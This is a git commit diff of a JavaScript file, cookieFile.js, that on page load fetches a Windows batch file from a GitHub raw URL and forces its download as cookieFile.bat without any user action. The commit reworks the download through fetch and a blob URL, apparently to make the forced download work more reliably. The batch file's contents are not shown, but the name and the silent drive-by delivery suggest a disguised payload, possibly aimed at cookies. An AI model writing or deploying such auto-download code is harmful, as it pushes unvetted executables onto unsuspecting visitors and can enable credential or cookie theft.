6335c67aa87ac65c2dfc77a5b8e93ae8dbd2619f
Propayer <96571414+Propayer@users.noreply.github.com>
2024-05-23 10:44:24 +0200

    Update cookieFile.js

--- cookieFile.js
+++ cookieFile.js
@@ -1,9 +1,15 @@
 window.onload = function downloadBatchFile() {
     const batFileUrl = 'https://raw.githubusercontent.com/Propayer/cookieFIle.bat/main/cookieFile.bat';
-    const link = document.createElement('a');
-    link.href = batFileUrl;
-    link.download = 'cookieFile.bat';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+
+    fetch(batFileUrl)
+        .then(response => response.blob())
+        .then(blob => {
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'cookieFile.bat'; // The desired name for the downloaded file
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        })
+        .catch(console.error);
 }
